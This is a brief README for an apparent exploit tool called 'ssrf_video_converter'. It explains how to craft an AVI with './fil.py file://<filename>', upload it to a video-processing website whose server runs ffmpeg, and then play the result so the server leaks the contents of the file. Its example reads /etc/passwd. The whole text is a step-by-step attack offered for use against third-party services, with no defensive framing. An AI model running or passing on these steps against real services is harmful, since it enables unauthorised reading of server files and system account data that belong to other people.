# ssrf_video_converter
./fil.py file://<filename> file_read.avi
Upload file_read.avi to some website that processes videofiles
(on server side, done by the videoservice) ffmpeg -i file_read.avi output.mp4
Click "Play" in the videoservice.
If you are lucky, you'll the content of <filename> from the server.
./fil.py file://etc/passwd file_read.avi

